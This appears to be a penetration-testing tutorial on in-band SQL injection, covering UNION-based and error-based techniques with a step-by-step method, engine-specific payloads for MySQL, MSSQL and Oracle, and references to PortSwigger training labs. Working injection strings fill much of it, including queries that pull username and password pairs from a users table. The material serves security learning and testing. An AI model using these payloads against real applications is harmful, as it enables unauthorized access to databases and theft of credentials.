# In-Band SQL Injection — UNION-Based & Error-Based

> In-band = the result of your injected query is visible directly in the HTTP response.
> This is the easiest category to work with and where you should always start when an
> injection point is confirmed.

---

## PART A — UNION-Based SQLi

### A.1 Concept
`UNION` combines results of two `SELECT` statements. To abuse it, your injected query
must return the **same number of columns**, with **compatible data types**, as the
original query.

### A.2 Step-by-Step Methodology

**Step 1 — Find the number of columns**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- keep incrementing until it errors out
```
or
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
The query that stops erroring tells you the column count.

**Step 2 — Find which columns are reflected on the page**
```sql
' UNION SELECT 'a','b','c'--
```
Whichever letter appears on the page = a column you can use to display extracted data.

**Step 3 — Fingerprint the database**
```sql
' UNION SELECT @@version,NULL,NULL--          -- MySQL/MSSQL
' UNION SELECT banner,NULL,NULL FROM v$version-- -- Oracle
```

**Step 4 — Enumerate schema (when table/column names unknown)**
```sql
-- MySQL / generic information_schema
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```
Oracle uses `all_tables` / `all_tab_columns` instead of `information_schema`.

**Step 5 — Extract data, concatenated into one column if needed**
```sql
' UNION SELECT username || ':' || password, NULL FROM users--      -- Oracle/Postgres
' UNION SELECT CONCAT(username,':',password), NULL FROM users--    -- MySQL
```

### A.3 Real-World Notes
- UNION attacks are loud and easy to catch in logs/WAFs — on real engagements this is
  usually your first confirmation step, not your final exfil method, because it's the
  noisiest.
- Column count mismatches are the #1 reason a "confirmed vulnerable" parameter looks like
  it "stopped working" mid-exploitation — always recount columns if the app's underlying
  query changes (e.g. a search box vs a detail page might query different tables).
- Type mismatches (numeric column expecting a number) cause errors — use `NULL` as a
  placeholder, then swap in your payload once you know which column is text-friendly.

### A.4 PortSwigger Labs (UNION track)
- SQL injection vulnerability allowing retrieval of hidden data
- SQL injection UNION attack, determining the number of columns returned
- SQL injection UNION attack, finding a column containing text
- SQL injection UNION attack, retrieving data from other tables
- SQL injection UNION attack, retrieving multiple values in a single column

---

## PART B — Error-Based SQLi

### B.1 Concept
Instead of relying on UNION output, you force the database to **throw an error that
contains the data you want**, and the application displays that raw DB error to you.

### B.2 Common Techniques by Engine

**MySQL — `XPATH` / `EXTRACTVALUE` / `UPDATEXML` error functions**
```sql
' AND extractvalue(1, concat(0x7e, (SELECT version())))--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```
`extractvalue()` and `updatexml()` expect valid XPath — feeding them a subquery result
causes a syntax error that **leaks the subquery's output** in the error message.

**MSSQL — type conversion errors**
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--
```
Forcing a string into an `int` conversion throws an error that includes the string value.

**Oracle**
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

### B.3 Real-World Notes
- Error-based only works if the application doesn't suppress DB errors. Modern
  production apps usually show generic 500 pages — this technique is more common in
  staging environments, internal tools, or legacy apps, which you'll see a lot in real
  engagements against internal corporate software.
- Even when the full error isn't shown, a *behavioral* difference (different error code,
  different response length) between a triggered error and a clean query can sometimes
  still be abused — this blurs into blind techniques (see next file).
- Always check error-based first when in-band UNION fails due to column-count issues —
  error-based doesn't care about column count at all.

### B.4 PortSwigger Labs (Error-based track)
- SQL injection attack, querying the database type and version (Oracle / non-Oracle path
  uses error messages when banner grabbing fails normally)
- Labs under "Examining the database" that use error messages to enumerate tables/columns
  when UNION isn't directly usable

---

## C. Quick Decision Rule

| Symptom | Use |
|---|---|
| Page shows extra content/rows when injecting | UNION-based |
| Page shows raw DB error text | Error-based |
| Page just says "Internal Server Error" with no detail | Move to Blind techniques |

Continue to → `02_Blind_SQLi_Boolean_Time.md`
